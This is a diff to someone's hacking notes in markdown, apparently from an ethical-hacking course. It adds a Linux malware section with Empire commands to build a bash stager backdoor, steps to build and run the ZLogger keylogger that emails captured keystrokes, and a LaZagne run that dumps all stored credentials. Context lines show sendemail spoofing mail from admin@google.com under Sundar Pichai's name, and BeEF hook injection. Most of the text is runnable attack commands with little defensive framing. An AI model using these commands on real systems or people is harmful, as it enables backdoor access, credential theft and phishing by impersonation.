@@ -173,6 +173,7 @@ Add to hstshijack.cap in payloads ,*:path/beef.js
 	- Redirect Browser
 	- Pretty Theft
 	- Fake Notification Bar
+
 ## Fake Emails
 1. Use some email spoof service but they end up in spam
 	- Google spoof email
@@ -256,6 +257,53 @@ sendemail --help
 sendemail -xu [email] -xp [password] -s [server:port] -f "admin@google.com" -t "target@email.com" -u "Titel of the email" -m "Mesage Body dropboxlink-dl=1 " -o message-header="From: Sundar Pichai <admin@google.com>"
 ```
 message-header it will show the name not the email in the delivery box
+
+## Linux Malware
+- In Empire we have the multi backdors that will work in Linux, Mac and Android
+```
+usestager multi/bash
+info
+set Listener NAME
+set OutFile /path/name
+execute
+```
+to run it as a test
+```
+bash test_bash_shell
+```
+interact 
+```
+interact [agent name]
+```
+- ZLooger for Linux
+```
+python zlogger.py -i 60 -l -e [email] -p [password] -o [Name]
+ls dist/
+```
+to run it
+```
+chmod +x linux-keyloger
+./linux-keyloger
+```
+remove the keyloger from the machine
+```
+cd .config
+cd autostart
+ls
+xinput.desktop
+```
+Now this is what's making the program start with the startup.
+```
+rm xinput.desktop
+```
+- LaZagne run on Linux
+https://github.com/AlessandroZ/LaZagne  
+Compilet or download de stand alone for linux  
+```
+chmod +x LaZange
+./LaZange --help
+./LaZange all
+```
 
 ## Mac OSX Malware
 Fat Rat and Empire can both generate OSX payloads.
